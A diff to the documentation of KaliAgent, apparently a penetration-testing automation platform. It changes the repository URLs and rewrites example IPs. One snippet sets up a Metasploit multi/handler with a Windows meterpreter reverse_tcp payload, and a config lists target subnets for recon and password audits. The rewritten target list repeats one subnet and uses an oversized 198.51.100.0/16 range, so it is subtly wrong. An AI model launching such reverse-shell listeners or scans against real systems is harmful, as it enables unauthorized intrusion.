@@ -265,7 +265,7 @@ KaliAgent is a security automation platform that:
 
 **Step 1: Clone Repository**
 ```bash
-git clone https://github.com/wezzels/agentic-ai.git
+git clone https://github.com/dmrobbi/agentic-ai.git
 cd agentic-ai/kali_dashboard
 ```
 
@@ -705,7 +705,7 @@ msf.connect()
 # Select exploit
 msf.use("exploit/multi/handler")
 msf.set("PAYLOAD", "windows/meterpreter/reverse_tcp")
-msf.set("LHOST", "192.168.1.100")
+msf.set("LHOST", "192.0.2.100")
 msf.set("LPORT", 4444)
 
 # Execute
@@ -729,9 +729,9 @@ msf.exploit()
 engagement = {
     "name": "Enterprise Assessment",
     "targets": [
-        "192.168.1.0/24",
-        "192.168.2.0/24",
-        "10.0.0.0/16"
+        "192.0.2.0/24",
+        "192.0.2.0/24",
+        "198.51.100.0/16"
     ],
     "playbooks": ["recon", "web_audit", "password_audit"],
     "parallel": True,
@@ -1097,7 +1097,7 @@ curl http://localhost:8001/api/engagements/{id}/report -o report.pdf
 **Important URLs:**
 - Dashboard: http://localhost:5173
 - API Docs: http://localhost:8001/docs
-- GitHub: https://github.com/wezzels/agentic-ai
+- GitHub: https://github.com/dmrobbi/agentic-ai
 
 ---
 
